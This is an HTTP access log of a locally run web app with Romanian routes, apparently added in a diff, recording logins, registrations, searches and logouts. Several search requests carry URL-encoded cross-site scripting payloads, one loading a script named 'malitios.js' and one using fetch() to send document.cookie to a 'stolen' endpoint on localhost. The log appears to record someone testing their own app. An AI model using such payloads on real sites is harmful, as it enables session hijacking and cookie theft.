+[2026-01-20T09:25:57.473Z] GET /cauta?nume=or - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:26:18.935Z] GET /logout - 200 - IP: ::1 - LOGOUT SUCCESS - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:26:18.936Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:26:18.937Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:28:39.732Z] GET /allusers - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:28:41.951Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:28:50.056Z] GET /allusers - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:28:50.083Z] GET /.well-known/appspecific/com.chrome.devtools.json - 404 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:29:22.820Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:29:22.822Z] GET /cauta?q=%3Cscript%20src=%22http://localhost:5000/static/malitios.js%22%3E%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:30:43.641Z] POST /register - 409 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:30:43.643Z] POST /register - 409 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:30:43.646Z] POST /register - 409 - IP: ::1 - REGISTER FAILED - Username: roxipoxi1234, Email: rox@gmail.com, Error: Duplicate entry - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:31:00.035Z] POST /verificare - 200 - IP: ::1 - LOGIN SUCCESS - Username: roxana1234 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:31:00.036Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:31:00.037Z] POST /verificare - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:32:30.316Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:32:30.318Z] GET /cauta?nume=%3Cscript%3Efetch(%27http://localhost:5000/api/date?stolen=%27+document.cookie)%3C/script%3E - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:32:54.891Z] GET /logout - 200 - IP: ::1 - LOGOUT SUCCESS - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:32:54.893Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
+[2026-01-20T09:32:54.894Z] GET /logout - 200 - IP: ::1 - UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0
